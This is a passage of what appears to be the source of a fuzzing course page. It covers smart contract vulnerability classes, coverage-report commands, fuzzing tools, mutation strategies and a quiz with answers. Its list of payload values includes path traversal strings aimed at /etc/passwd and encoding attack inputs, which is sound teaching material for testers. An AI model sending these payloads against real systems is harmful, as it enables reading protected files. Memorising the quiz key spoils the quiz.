      "Invariant tests: Stateful testing with handler contracts for complex scenarios",
    ],
  },
  {
    title: "Common Smart Contract Vulnerabilities",
    icon: <BugReportIcon />,
    content: "Focus your fuzzing on these common vulnerability patterns that have caused billions in losses. Each vulnerability type requires specific fuzzing strategies—random inputs won't find reentrancy, and single-transaction tests won't find flash loan attacks. Understanding these patterns helps you write targeted fuzz tests and properties. Reentrancy is the classic smart contract vulnerability: if your contract calls an external contract before updating state, that external contract can call back into yours and exploit the stale state. The DAO hack that split Ethereum was a reentrancy bug. Access control issues occur when functions that should be admin-only are callable by anyone—often due to missing modifiers or incorrect require statements. Integer overflow/underflow (in Solidity < 0.8) allowed attackers to wrap balances from 0 to MAX_UINT. Flash loans enable attackers to borrow millions in a single transaction, manipulate prices or votes, and repay—all atomically. Oracle manipulation exploits price feeds that can be influenced within a transaction. Frontrunning MEV bots watch the mempool and insert transactions to profit from pending trades.",
    table: {
      headers: ["Vulnerability", "Description", "Fuzzing Strategy"],
      rows: [
        ["Reentrancy", "External call before state update allows callbacks", "Fuzz call sequences with attacker contract that re-enters"],
        ["Integer Overflow", "Arithmetic exceeds type bounds (pre-0.8)", "Fuzz with boundary values: 0, MAX_UINT, MAX-1, large multiplications"],
        ["Access Control", "Missing or weak authorization checks", "Fuzz from different msg.sender addresses including 0x0"],
        ["Flash Loan Attack", "Price manipulation via borrowed capital", "Fuzz with large instant liquidity in single transaction"],
        ["Oracle Manipulation", "Stale or manipulable price feeds", "Fuzz oracle return values with extremes and mid-block changes"],
        ["Frontrunning", "Transaction ordering attacks", "Fuzz transaction sequences and simulate mempool visibility"],
        ["Delegatecall Injection", "Arbitrary code execution in context", "Fuzz target addresses in delegatecall with malicious contracts"],
        ["Signature Replay", "Reusing valid signatures on other chains/contracts", "Fuzz with repeated/modified signatures, wrong chain IDs"],
        ["Precision Loss", "Rounding errors in division", "Fuzz with small amounts that trigger rounding edge cases"],
        ["DOS via Revert", "Attacker forces functions to always revert", "Fuzz with contracts that always revert in callbacks"],
      ],
    },
  },
];

// ========== COVERAGE ANALYSIS ==========
const coverageAnalysisSections: TopicSection[] = [
  {
    title: "Understanding Coverage Metrics",
    icon: <SpeedIcon />,
    content: "Coverage metrics tell you how much of your target code the fuzzer has exercised. Higher coverage generally means more thorough testing, but coverage alone doesn't guarantee bug-finding. Understanding different coverage types helps you interpret fuzzer output and identify gaps in your testing. Line coverage counts which source lines executed—simple but can miss branch conditions. Branch coverage tracks whether both true and false paths of each conditional were taken, catching cases where code is reached but not fully exercised. Edge coverage (used by AFL++) counts transitions between basic blocks, providing finer granularity than branch coverage. Path coverage tracks unique sequences of edges, but the number of paths explodes exponentially and isn't practical for most programs. The relationship between coverage and bugs is nuanced: low coverage definitely means untested code (and potential bugs), but high coverage doesn't guarantee all bugs are found—bugs often lurk in complex interactions between code paths, not just individual lines. Coverage is most useful for identifying 'fuzzing blind spots'—code regions the fuzzer hasn't reached that might contain vulnerabilities.",
    table: {
      headers: ["Metric", "What It Measures", "Typical Tool"],
      rows: [
        ["Line Coverage", "Which source lines were executed at least once", "gcov, lcov, llvm-cov"],
        ["Branch Coverage", "Which branch directions (true/false) were taken", "gcov, llvm-cov"],
        ["Edge Coverage", "Transitions between basic blocks (A→B vs A→C)", "AFL++, libFuzzer, Honggfuzz"],
        ["Path Coverage", "Unique sequences of edges through the program", "Symbolic executors (KLEE)"],
        ["Function Coverage", "Which functions were called", "gcov, llvm-cov"],
        ["MC/DC", "Modified condition/decision coverage for safety-critical", "VectorCAST, LDRA"],
      ],
    },
    points: [
      "Edge coverage is most useful for fuzzing—counts block-to-block transitions, not just blocks reached",
      "100% line coverage doesn't mean all bugs found—need branch/path coverage for thorough testing",
      "Diminishing returns: going from 80% to 90% is easier and more impactful than 95% to 99%",
      "Coverage plateaus indicate need for better seeds, dictionaries, or custom mutators",
      "Track coverage over time to measure fuzzing campaign progress and ROI",
      "Low-covered areas often hide bugs—prioritize improving coverage in security-critical code",
    ],
  },
  {
    title: "Generating Coverage Reports",
    icon: <DataObjectIcon />,
    content: "Visualize your fuzzing coverage to identify untested code regions and prioritize improvements. Coverage reports transform raw coverage data into human-readable HTML or text formats that highlight which lines, functions, and files have been tested. For LLVM-based fuzzers (libFuzzer, AFL++ with clang), use llvm-cov which produces detailed source-level reports showing exact line counts. For GCC-compiled code, use gcov and lcov for similar functionality. The workflow is: (1) compile with coverage instrumentation, (2) run your fuzzer or replay corpus through the instrumented binary, (3) merge coverage data from multiple runs, (4) generate HTML reports for review. Modern fuzzing setups often generate coverage continuously, tracking improvement over time. When reviewing coverage reports, focus on security-critical code (parsers, validators, auth, crypto) and investigate why certain functions have low coverage—they might need better seeds, dictionaries, or a different harness entry point.",
    code: `# ========== LLVM/Clang Coverage (for libFuzzer/AFL++) ==========
# Step 1: Compile with coverage instrumentation
clang -fprofile-instr-generate -fcoverage-mapping \\
    -o target_cov target.c

# Step 2: Run corpus through instrumented binary
LLVM_PROFILE_FILE="coverage-%p.profraw" \\
    for f in corpus/*; do ./target_cov "$f"; done

# Step 3: Merge raw profiles
llvm-profdata merge -sparse coverage-*.profraw -o coverage.profdata

# Step 4: Generate HTML report
llvm-cov show ./target_cov -instr-profile=coverage.profdata \\
    -format=html -output-dir=coverage_report
# Open coverage_report/index.html in browser

# Step 5: Get summary statistics
llvm-cov report ./target_cov -instr-profile=coverage.profdata
# Shows: Files, Functions, Lines, Branches with percentages

# ========== GCC Coverage (gcov/lcov) ==========
# Step 1: Compile with gcov support
gcc --coverage -o target target.c

# Step 2: Run corpus
for f in corpus/*; do ./target "$f"; done

# Step 3: Process coverage data
gcov target.c  # Creates target.c.gcov

# Step 4: Generate HTML with lcov
lcov --capture --directory . --output-file coverage.info
lcov --remove coverage.info '/usr/*' -o filtered.info  # Remove system headers
genhtml filtered.info --output-directory html_report

# ========== libFuzzer built-in coverage ==========
./fuzzer corpus/ -runs=0 -dump_coverage=1
# Creates coverage.*.txt files with function coverage`,
    tip: "Run coverage analysis periodically during long fuzzing campaigns to check progress. If coverage plateaus, investigate why and add targeted seeds or dictionaries.",
  },
  {
    title: "Coverage-Driven Corpus Improvement",
    icon: <AutoFixHighIcon />,
    content: "Use coverage data to improve your seed corpus and identify fuzzing blind spots. Coverage analysis reveals which code your fuzzer is exploring and, more importantly, which code it's missing. Low-covered areas represent fuzzing blind spots where bugs might hide undetected. The workflow is: (1) generate coverage report, (2) identify low-coverage functions and files, (3) analyze why they're not covered (missing seeds? unreachable code? complex constraints?), (4) create targeted seeds or dictionaries to improve coverage. For functions with 0% coverage, trace backward from the function to find what calls it and what conditions must be true to reach it. Sometimes the issue is the harness entry point—if you're fuzzing a high-level API, internal utility functions might not be reachable. Consider creating additional harnesses that target specific subsystems. Coverage-driven corpus minimization is also essential: use afl-cmin or llvm-cov's merge functionality to identify inputs that provide unique coverage and discard redundant seeds that slow down fuzzing without finding new code.",
    code: `# ========== Identify uncovered code ==========
# Find functions with 0% coverage
llvm-cov report ./target -instr-profile=coverage.profdata \\
    | grep "0.00%" | head -20

# Detailed view of specific file
llvm-cov show ./target -instr-profile=coverage.profdata \\
    --show-line-counts src/parser.c | less

# ========== Create targeted seeds for uncovered code ==========
# Example: If parse_xml_comment() has 0% coverage, add:
echo '<!-- test comment -->' > corpus/xml_comment_seed
echo '<!-- multi\\nline\\ncomment -->' > corpus/xml_multiline_comment
echo '<!---->​' > corpus/xml_empty_comment

# If parse_cdata() is uncovered:
echo '<![CDATA[test data]]>' > corpus/cdata_seed

# ========== AFL++ corpus minimization by coverage ==========
# Keep only inputs that contribute unique coverage
afl-cmin -i full_corpus/ -o min_corpus/ -- ./target @@
echo "Minimized: $(ls full_corpus/ | wc -l) -> $(ls min_corpus/ | wc -l)"

# ========== Measure coverage improvement ==========
# Before adding new seeds
llvm-cov report ./target -instr-profile=before.profdata | tail -1

# After adding new seeds
./target < new_seed  # Run new seeds
llvm-profdata merge before.profdata new.profdata -o merged.profdata
llvm-cov report ./target -instr-profile=merged.profdata | tail -1
# Compare line/branch percentages

# ========== Find what code calls an uncovered function ==========
# Use cscope, ctags, or grep to trace callers
grep -rn "uncovered_function" src/
# Then create seeds that exercise those code paths`,
    points: [
      "Focus on high-risk uncovered areas: parsers, validators, error handlers, crypto, auth",
      "Write targeted seeds for unreached code paths—understand the input format needed to reach them",
      "Consider removing or stubbing unreachable dead code that inflates uncovered percentages",
      "Track coverage over time to measure fuzzing effectiveness and diminishing returns",
      "Multiple harnesses: If one entry point can't reach certain code, create additional harnesses",
      "Dictionary enhancement: If coverage plateaus, extract new tokens from source code analysis",
    ],
  },
];

// ========== ADDITIONAL TOOLS ==========
const additionalFuzzingTools: FuzzingTool[] = [
  {
    name: "syzkaller",
    target: "OS Kernels",
    description: "Google's coverage-guided kernel fuzzer. Generates syscall sequences based on descriptions. Found thousands of Linux kernel bugs.",
    installCmd: "git clone https://github.com/google/syzkaller && cd syzkaller && make",
    exampleCmd: "./bin/syz-manager -config=my.cfg",
    bestFor: ["Linux kernel", "Windows kernel", "FreeBSD", "Syscall fuzzing", "Driver bugs"],
  },
  {
    name: "cargo-fuzz",
    target: "Rust Applications",
    description: "Cargo subcommand for fuzzing Rust code. Uses libFuzzer under the hood with Rust-native integration.",
    installCmd: "cargo install cargo-fuzz",
    exampleCmd: "cargo fuzz run my_fuzz_target -- -max_total_time=3600",
    bestFor: ["Rust libraries", "Parser fuzzing", "Memory safety", "Unsafe code blocks"],
  },
  {
    name: "go-fuzz / Fuzz (Go 1.18+)",
    target: "Go Applications",
    description: "Native Go fuzzing support built into the Go toolchain. Coverage-guided with corpus management.",
    installCmd: "# Built into Go 1.18+, no installation needed",
    exampleCmd: "go test -fuzz=FuzzMyFunction -fuzztime=1h ./...",
    bestFor: ["Go libraries", "Parsers", "Encoding/decoding", "Network protocols"],
  },
  {
    name: "OSS-Fuzz",
    target: "Open Source Projects",
    description: "Google's continuous fuzzing service for open source. Runs fuzzers 24/7 on thousands of projects with automatic bug filing.",
    installCmd: "# Apply at: github.com/google/oss-fuzz",
    exampleCmd: "python infra/helper.py build_fuzzers --sanitizer address my_project",
    bestFor: ["Open source libraries", "Continuous fuzzing", "Free compute", "Automated triage"],
  },
  {
    name: "Domato",
    target: "Browser DOM/JS Engines",
    description: "Grammar-based DOM fuzzer from Google Project Zero. Generates complex HTML/CSS/JS to find browser bugs.",
    installCmd: "git clone https://github.com/googleprojectzero/domato",
    exampleCmd: "python generator.py > test.html && chromium test.html",
    bestFor: ["Browser engines", "DOM parsing", "JavaScript engines", "CSS rendering"],
  },
  {
    name: "boofuzz",
    target: "Network Protocols",
    description: "Network protocol fuzzing framework (Sulley successor). Generates and sends malformed protocol messages.",
    installCmd: "pip install boofuzz",
    exampleCmd: "python my_protocol_fuzzer.py",
    bestFor: ["Network services", "Protocol implementations", "Stateful fuzzing", "Custom protocols"],
  },
  {
    name: "Peach Fuzzer",
    target: "Any Format/Protocol",
    description: "Enterprise-grade grammar-based fuzzer. Define data models in XML (Pit files) for structured fuzzing.",
    installCmd: "# Commercial: peachtech.com / Community: github.com/MozillaSecurity/peach",
    exampleCmd: "peach -pit my_format.xml",
    bestFor: ["File formats", "Network protocols", "Compliance testing", "Enterprise fuzzing"],
  },
  {
    name: "Fuzzilli",
    target: "JavaScript Engines",
    description: "Google's coverage-guided JavaScript engine fuzzer. Uses intermediate language for generating valid JS programs.",
    installCmd: "git clone https://github.com/googleprojectzero/fuzzilli && swift build -c release",
    exampleCmd: "./Fuzzilli --profile=v8 ./path/to/d8",
    bestFor: ["V8", "JavaScriptCore", "SpiderMonkey", "JIT bugs", "Type confusion"],
  },
];

// ========== ADDITIONAL MUTATION STRATEGIES ==========
const additionalMutations = [
  {
    name: "CMP Log Instrumentation",
    description: "Extract comparison operands at runtime to guide mutations toward satisfying conditions",
    example: "if (x == 0xdeadbeef) → mutate input to include 0xdeadbeef",
    finds: ["Magic number checks", "Checksum validation", "Protocol magic bytes"],
  },
  {
    name: "Input-to-State Correspondence",
    description: "Track which input bytes influence which program state for targeted mutation",
    example: "input[5:9] → length field → mutate those bytes for size bugs",
    finds: ["Length field bugs", "Offset calculation errors", "Index out-of-bounds"],
  },
  {
    name: "MOpt Mutation Scheduling",
    description: "Particle swarm optimization to find optimal mutation operator distribution",
    example: "Dynamic: 40% bit-flip, 30% havoc, 20% splice, 10% dictionary",
    finds: ["Improved coverage efficiency", "Faster bug discovery", "Better corpus evolution"],
  },
  {
    name: "Structure-Aware Mutation",
    description: "Parse input format and mutate at structural boundaries",
    example: "JSON: Mutate values within valid structure, swap objects, nest deeply",
    finds: ["Parser state bugs", "Deep nesting issues", "Type confusion"],
  },
  {
    name: "Redqueen (I2S)",
    description: "Input-to-State correspondence for bypassing magic byte comparisons without dictionaries",
    example: "Automatically extracts and injects comparison operands",
    finds: ["Magic bytes", "Checksum bypasses", "Multi-byte comparisons"],
  },
  {
    name: "Grammar Mutation",
    description: "Mutate AST nodes while maintaining syntactic validity",
    example: "SQL: SELECT * → SELECT DISTINCT, WHERE 1=1 → WHERE 1=2",
    finds: ["Semantic bugs", "Type system issues", "Query optimizer bugs"],
  },
];

// ========== ADDITIONAL MAGIC VALUES ==========
const additionalPayloads = {
  floatingPoint: [
    { value: "0.0", reason: "Zero division, normalization" },
    { value: "-0.0", reason: "Negative zero edge cases" },
    { value: "Infinity / -Infinity", reason: "Overflow handling" },
    { value: "NaN", reason: "Not-a-number propagation" },
    { value: "1e-308 (denormal)", reason: "Denormalized number handling" },
    { value: "1e308 (near max)", reason: "Near-overflow conditions" },
    { value: "2.2250738585072014e-308", reason: "Smallest normal double" },
  ],
  unicode: [
    { value: "\\u0000 (NUL)", reason: "Null byte in strings" },
    { value: "\\uFEFF (BOM)", reason: "Byte order mark handling" },
    { value: "\\uD800 (high surrogate)", reason: "Unpaired surrogates" },
    { value: "\\u202E (RTL override)", reason: "Bidirectional text attacks" },
    { value: "\\u0000-\\u001F", reason: "Control characters" },
    { value: "\\uFFFF (non-character)", reason: "Invalid Unicode" },
    { value: "Very long UTF-8 sequences", reason: "Overlong encoding attacks" },
  ],
  timing: [
    { value: "Year 2038 (0x7FFFFFFF)", reason: "32-bit time_t overflow" },
    { value: "Year 1970 epoch (0)", reason: "Unix epoch edge case" },
    { value: "Negative timestamps", reason: "Pre-epoch handling" },
    { value: "Leap seconds", reason: "Time calculation bugs" },
    { value: "DST transitions", reason: "Timezone handling" },
    { value: "Year 10000", reason: "Y10K formatting bugs" },
  ],
  paths: [
    { value: "../../../etc/passwd", reason: "Path traversal" },
    { value: "....//....//", reason: "Filter bypass traversal" },
    { value: "/dev/null, /dev/zero", reason: "Special files" },
    { value: "CON, PRN, AUX (Windows)", reason: "Reserved names" },
    { value: "Very long paths (>PATH_MAX)", reason: "Buffer overflow" },
    { value: "Null bytes in path", reason: "Truncation attacks" },
  ],
};

const QUIZ_QUESTION_COUNT = 10;
const QUIZ_ACCENT_COLOR = "#00ffff";
const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Fundamentals",
    question: "Fuzzing is best described as:",
    options: [
      "Automated input generation to find bugs",
      "Manual code review only",
      "Static analysis without execution",
      "Firewall rule tuning",
    ],
    correctAnswer: 0,
    explanation: "Fuzzing feeds many inputs to trigger unexpected behavior.",
  },
  {
    id: 2,
    topic: "Fundamentals",
    question: "Coverage-guided fuzzing uses:",
    options: ["Runtime coverage feedback", "Only static signatures", "Only wordlists", "No execution"],
    correctAnswer: 0,
    explanation: "Coverage feedback helps select inputs that reach new code.",
  },
  {
    id: 3,
    topic: "Fundamentals",
    question: "Grey-box fuzzing means:",
    options: ["Using partial feedback like coverage", "No knowledge of the target", "Full symbolic execution", "Only manual testing"],
    correctAnswer: 0,
    explanation: "Grey-box fuzzing uses limited internal feedback.",
  },
  {
    id: 4,
    topic: "Harness",
    question: "A fuzzing harness is:",
    options: ["A small wrapper that feeds input to a target", "A firewall rule set", "A vulnerability scanner", "A log parser"],
    correctAnswer: 0,
    explanation: "Harnesses adapt targets for fuzzing inputs.",
  },
  {
    id: 5,
    topic: "Harness",
    question: "A good harness should be:",
    options: ["Deterministic and fast", "Non-deterministic", "Slow and stateful only", "Dependent on manual input"],
    correctAnswer: 0,
    explanation: "Deterministic behavior improves coverage and triage.",
  },
  {
    id: 6,
    topic: "Corpus",
    question: "A seed corpus is used to:",
    options: ["Provide valid starting inputs", "Replace sanitizers", "Disable coverage", "Hide crashes"],
    correctAnswer: 0,
    explanation: "Seeds help the fuzzer reach deeper states sooner.",
  },
  {
    id: 7,
    topic: "Corpus",
    question: "Corpus minimization aims to:",
    options: ["Keep only inputs that add coverage", "Increase input size", "Remove all inputs", "Disable triage"],
    correctAnswer: 0,
    explanation: "Minimization keeps a small, high-value corpus.",
  },
  {
    id: 8,
    topic: "Corpus",
    question: "Crash deduplication groups crashes by:",
    options: ["Similar stack traces or coverage", "File size only", "CPU usage", "Timestamp"],
    correctAnswer: 0,
    explanation: "Deduplication reduces duplicate crash reports.",
  },
  {
    id: 9,
    topic: "Mutation",
    question: "Mutation-based fuzzing primarily:",
    options: ["Mutates existing inputs", "Generates from grammar only", "Uses no inputs", "Only checks logs"],
    correctAnswer: 0,
    explanation: "Mutation fuzzers change seeds to explore new paths.",
  },
  {
    id: 10,
    topic: "Mutation",
    question: "A dictionary in fuzzing provides:",
    options: ["Known tokens to insert", "Stack traces", "Crash logs", "Compiler flags"],
    correctAnswer: 0,
    explanation: "Dictionaries help reach parsers that expect keywords.",
  },
  {
    id: 11,
    topic: "Mutation",
    question: "Bit flipping is useful for:",
    options: ["Boundary and off-by-one cases", "TLS handshakes", "File compression", "Log rotation"],
    correctAnswer: 0,
    explanation: "Small mutations can trigger edge conditions.",
  },
  {
    id: 12,
    topic: "Mutation",
    question: "Havoc mode typically:",
    options: ["Applies random combinations of mutations", "Only flips one bit", "Stops all mutations", "Uses only grammar rules"],
    correctAnswer: 0,
    explanation: "Havoc is a chaotic, high-entropy stage.",
  },
  {
    id: 13,
    topic: "Mutation",
    question: "Splicing does what?",
    options: ["Combines parts of two inputs", "Encrypts inputs", "Removes all bytes", "Only changes headers"],
    correctAnswer: 0,
    explanation: "Splicing mixes inputs to create new variants.",
  },
  {
    id: 14,
    topic: "Mutation",
    question: "Arithmetic mutation targets:",
    options: ["Numeric boundary values", "Only strings", "Only timestamps", "Only Unicode"],
    correctAnswer: 0,
    explanation: "Small numeric changes hit boundary conditions.",
  },
  {
    id: 15,
    topic: "Coverage",
    question: "Edge coverage tracks:",
    options: ["Transitions between basic blocks", "Only function names", "Only CPU usage", "Only file size"],
    correctAnswer: 0,
    explanation: "Edge coverage counts control-flow transitions.",
  },
  {
    id: 16,
    topic: "Coverage",
    question: "Compile-time instrumentation is used to:",
    options: ["Collect coverage during execution", "Encrypt binaries", "Disable logs", "Remove symbols"],
    correctAnswer: 0,
    explanation: "Instrumentation enables coverage-guided fuzzing.",
  },
  {
    id: 17,
    topic: "Execution",
    question: "In-process fuzzers are typically:",
    options: ["Faster due to lower overhead", "Slower than fork mode", "Unable to use sanitizers", "Only for web apps"],
    correctAnswer: 0,
    explanation: "In-process fuzzers avoid process startup costs.",
  },
  {
    id: 18,
    topic: "Execution",
    question: "AFL++ often uses a:",
    options: ["Forkserver to speed execs", "Database server", "Browser engine", "Kernel module"],
    correctAnswer: 0,
    explanation: "Forkserver reduces process creation overhead.",
  },
  {
    id: 19,
    topic: "Execution",
    question: "libFuzzer is:",
    options: ["In-process and linked with the target", "A network scanner", "A GUI-only fuzzer", "A packet sniffer"],
    correctAnswer: 0,
    explanation: "libFuzzer links into the target for fast cycles.",
  },
  {
    id: 20,
    topic: "Execution",
    question: "Honggfuzz is known for:",
    options: ["Parallel fuzzing and hardware coverage options", "Only black-box fuzzing", "Only Java fuzzing", "Only mutation dictionaries"],
    correctAnswer: 0,
    explanation: "Honggfuzz supports multi-process and hardware tracing.",
  },
  {
    id: 21,
    topic: "Sanitizers",
    question: "AddressSanitizer detects:",
    options: ["Out-of-bounds and use-after-free bugs", "SQL injection", "CSRF", "TLS misconfigurations"],
    correctAnswer: 0,
    explanation: "ASan finds memory safety issues.",
  },
  {
    id: 22,
    topic: "Sanitizers",
    question: "UBSan detects:",
    options: ["Undefined behavior like overflows", "Network latency", "Disk errors", "TLS errors"],
    correctAnswer: 0,
    explanation: "UBSan catches undefined behavior at runtime.",
  },
  {
    id: 23,
    topic: "Sanitizers",
    question: "MSan detects:",
    options: ["Use of uninitialized memory", "SQL injection", "XSS", "Buffer size only"],
    correctAnswer: 0,
    explanation: "MSan reports reads of uninitialized data.",
  },
  {
    id: 24,
    topic: "Sanitizers",
    question: "LSan detects:",
    options: ["Memory leaks", "Cross-site scripting", "Weak passwords", "Race conditions only"],
    correctAnswer: 0,
    explanation: "LSan reports memory that is never freed.",
  },
  {
    id: 25,
    topic: "Crashes",
    question: "A timeout usually indicates:",
    options: ["A hang or infinite loop", "A clean exit", "A compiler error", "A valid input"],
    correctAnswer: 0,
    explanation: "Timeouts often signal hangs or heavy computation.",
  },
  {
    id: 26,
    topic: "Crashes",
    question: "An out-of-memory crash often means:",
    options: ["Input triggers excessive allocation", "The input is valid", "Coverage is low", "The sanitizer is off"],
    correctAnswer: 0,
    explanation: "Huge allocations can exhaust memory.",
  },
  {
    id: 27,
    topic: "Triage",
    question: "Crash triage should include:",
    options: ["Reproduce with the same input", "Delete the input", "Disable sanitizers", "Ignore stack traces"],
    correctAnswer: 0,
    explanation: "Repro steps confirm the issue.",
  },
  {
    id: 28,
    topic: "Triage",
    question: "Minimizing a crash input helps to:",
    options: ["Isolate the root cause", "Hide the bug", "Reduce coverage", "Disable ASan"],
    correctAnswer: 0,
    explanation: "Smaller inputs simplify debugging.",
  },
  {
    id: 29,
    topic: "Triage",
    question: "Reproducibility matters because:",
    options: ["It confirms a real defect", "It reduces coverage", "It slows fuzzing", "It disables triage"],
    correctAnswer: 0,
    explanation: "Non-reproducible crashes are hard to fix.",
  },
  {
    id: 30,
    topic: "Performance",
    question: "Executions per second (EPS) is:",
    options: ["A key fuzzing throughput metric", "A cryptographic function", "A CPU voltage", "A filesystem setting"],
    correctAnswer: 0,
    explanation: "Higher EPS explores more inputs.",
  },
  {
    id: 31,
    topic: "Performance",
    question: "Persistent mode improves speed by:",
    options: ["Reusing a process for many inputs", "Rebooting the machine", "Disabling coverage", "Using a GUI"],
    correctAnswer: 0,
    explanation: "Persistent loops avoid process restarts.",
  },
  {
    id: 32,
    topic: "Performance",
    question: "Reducing logging during fuzzing:",
    options: ["Improves throughput", "Prevents crashes", "Fixes bugs", "Increases code size"],
    correctAnswer: 0,
    explanation: "Less IO means faster execution.",
  },
  {
    id: 33,
    topic: "Coverage",
    question: "A new coverage path indicates:",
    options: ["A potentially interesting input", "A fixed bug", "A compiler warning", "A patch failure"],
    correctAnswer: 0,
    explanation: "New paths mean new behavior to explore.",
  },
  {
    id: 34,
    topic: "Corpus",
    question: "High-quality seeds usually:",
    options: ["Are valid and diverse", "Are all empty", "Only contain zeros", "Are all identical"],
    correctAnswer: 0,
    explanation: "Diverse valid inputs reach more code.",
  },
  {
    id: 35,
    topic: "Techniques",
    question: "Grammar-based fuzzing is best for:",
    options: ["Structured inputs like file formats", "Random byte streams only", "Network latency testing", "CPU benchmarking"],
    correctAnswer: 0,
    explanation: "Grammars preserve structure while mutating.",
  },
  {
    id: 36,
    topic: "Techniques",
    question: "Stateful fuzzing targets:",
    options: ["Protocols with sequences of messages", "Only single files", "Static images", "Only CPU registers"],
    correctAnswer: 0,
    explanation: "Stateful fuzzers track protocol state.",
  },
  {
    id: 37,
    topic: "Techniques",
    question: "Differential fuzzing compares:",
    options: ["Multiple implementations for inconsistent behavior", "Only file sizes", "Only timestamps", "Only bandwidth"],
    correctAnswer: 0,
    explanation: "Differences between implementations reveal bugs.",
  },
  {
    id: 38,
    topic: "Techniques",
    question: "Property-based fuzzing checks:",
    options: ["Invariants that must always hold", "Only runtime speed", "Only log volume", "Only formatting"],
    correctAnswer: 0,
    explanation: "Properties define expected behavior for all inputs.",
  },
  {
    id: 39,
    topic: "Techniques",
    question: "Mutation-based fuzzing is useful when:",
    options: ["Input format is unknown or complex", "A strict grammar is required", "No inputs exist", "Only network packets are used"],
    correctAnswer: 0,
    explanation: "Mutation fuzzers can explore without full specs.",
  },
  {
    id: 40,
    topic: "Tools",
    question: "AFL++ is best for:",
    options: ["Native binaries and file parsers", "Only web fuzzing", "Only mobile apps", "Only packet capture"],
    correctAnswer: 0,
    explanation: "AFL++ targets native code with coverage guidance.",
  },
  {
    id: 41,
    topic: "Tools",
    question: "libFuzzer is best for:",
    options: ["Library APIs and unit-level fuzzing", "Only network scanning", "Only GUI testing", "Only kernel fuzzing"],
    correctAnswer: 0,
    explanation: "libFuzzer is designed for in-process library fuzzing.",
  },
  {
    id: 42,
    topic: "Tools",
    question: "ffuf is commonly used for:",
    options: ["Web directory and parameter fuzzing", "Kernel debugging", "Heap grooming", "Binary patching"],
    correctAnswer: 0,
    explanation: "ffuf focuses on web app fuzzing.",
  },
  {
    id: 43,
    topic: "Tools",
    question: "Burp Intruder is:",
    options: ["A GUI fuzzing tool for web requests", "A kernel fuzzer", "A static analyzer", "A crash minimizer"],
    correctAnswer: 0,
    explanation: "Intruder fuzzes HTTP requests in a GUI workflow.",
  },
  {
    id: 44,
    topic: "Tools",
    question: "Radamsa is known for:",
    options: ["Black-box mutation of inputs", "Coverage-guided fuzzing only", "Symbolic execution", "Network packet capture"],
    correctAnswer: 0,
    explanation: "Radamsa mutates inputs without instrumentation.",
  },
  {
    id: 45,
    topic: "Tools",
    question: "Jazzer targets:",
    options: ["JVM languages like Java and Kotlin", "Only C code", "Only web apps", "Only firmware"],
    correctAnswer: 0,
    explanation: "Jazzer is a JVM fuzzing tool.",
  },
  {
    id: 46,
    topic: "Tools",
    question: "Atheris targets:",
    options: ["Python code", "Only C code", "Only SQL queries", "Only kernel modules"],
    correctAnswer: 0,
    explanation: "Atheris is a Python fuzzing engine.",
  },
  {
    id: 47,
    topic: "Harness",
    question: "A common libFuzzer entry point signature is:",
    options: ["LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)", "main(int argc, char **argv)", "void start()", "int fuzz()"],
    correctAnswer: 0,
    explanation: "libFuzzer uses LLVMFuzzerTestOneInput.",
  },
  {
    id: 48,
    topic: "Harness",
    question: "To speed fuzzing, prefer:",
    options: ["In-memory processing over disk IO", "Heavy logging", "Network calls", "Manual input"],
    correctAnswer: 0,
    explanation: "Avoiding slow IO increases throughput.",
  },
  {
    id: 49,
    topic: "Harness",
    question: "Timeouts should be set to:",
    options: ["Detect hangs without too many false positives", "Never trigger", "Always trigger", "Disable fuzzing"],
    correctAnswer: 0,
    explanation: "Timeouts balance hang detection and valid slow cases.",
  },
  {
    id: 50,
    topic: "Harness",
    question: "Compiling with sanitizers helps:",
    options: ["Turn bugs into visible crashes", "Reduce coverage", "Disable fuzzing", "Hide errors"],
    correctAnswer: 0,
    explanation: "Sanitizers make subtle bugs detectable.",
  },
  {
    id: 51,
    topic: "Corpus",
    question: "Seed selection should aim for:",
    options: ["Diversity across formats and sizes", "Only empty files", "Only the largest file", "Only one sample"],
    correctAnswer: 0,
    explanation: "Diverse seeds improve coverage early.",
  },
  {
    id: 52,
    topic: "Mutation",
    question: "Dictionary tokens are especially useful for:",
    options: ["Keyword-driven parsers", "Random byte streams", "CPU benchmarks", "Disk tests"],
    correctAnswer: 0,
    explanation: "Tokens help reach parser code paths.",
  },
  {
    id: 53,
    topic: "Mutation",
    question: "Magic bytes matter because:",
    options: ["They gate file format parsing", "They disable sanitizers", "They slow down IO", "They fix bugs"],
    correctAnswer: 0,
    explanation: "Valid magic bytes are required to parse formats.",
  },
  {
    id: 54,
    topic: "Safety",
    question: "Fuzzing should be done:",
    options: ["Only with authorization and scope", "On any public system", "Without logging", "Only on production"],
    correctAnswer: 0,
    explanation: "Fuzzing can be disruptive and needs permission.",
  },
  {
    id: 55,
    topic: "Reporting",
    question: "A good fuzzing bug report includes:",
    options: ["Repro input and stack trace", "Only a screenshot", "Only the tool name", "Only the date"],
    correctAnswer: 0,
    explanation: "Inputs and traces help developers reproduce and fix.",
  },
  {
    id: 56,
    topic: "Operations",
    question: "CI fuzzing helps by:",
    options: ["Catching regressions automatically", "Removing coverage", "Disabling tests", "Hiding crashes"],
    correctAnswer: 0,
    explanation: "CI fuzzing keeps bug fixes from regressing.",
  },
  {
    id: 57,
    topic: "Operations",
    question: "To reproduce a crash, keep:",
    options: ["The exact input and binary build", "Only a log snippet", "Only the seed count", "Only the runtime"],
    correctAnswer: 0,
    explanation: "Repro requires the same input and environment.",
  },
  {
    id: 58,
    topic: "Fundamentals",
    question: "Grey-box fuzzing uses feedback like:",
    options: ["Coverage or sanitizer signals", "Only timestamps", "Only file sizes", "Only hashes"],
    correctAnswer: 0,
    explanation: "Feedback guides input selection.",
  },
  {
    id: 59,
    topic: "Fundamentals",
    question: "White-box fuzzing often uses:",
    options: ["Symbolic execution", "Only mutation", "Only random inputs", "No program analysis"],
    correctAnswer: 0,
    explanation: "White-box fuzzing uses deeper program analysis.",
  },
  {
    id: 60,
    topic: "Value",
    question: "Fuzzing is useful for:",
    options: ["Reliability and security testing", "Only UI design", "Only marketing", "Only backups"],
    correctAnswer: 0,
    explanation: "Fuzzing uncovers crashes and security bugs.",
  },
  {
    id: 61,
    topic: "Triage",
    question: "Stack traces help by:",
    options: ["Pointing to the failing code path", "Reducing coverage", "Avoiding reproduction", "Disabling sanitizers"],
    correctAnswer: 0,
    explanation: "Traces show where the failure happened.",
  },
  {
    id: 62,
    topic: "Crashes",
    question: "A SIGSEGV usually means:",
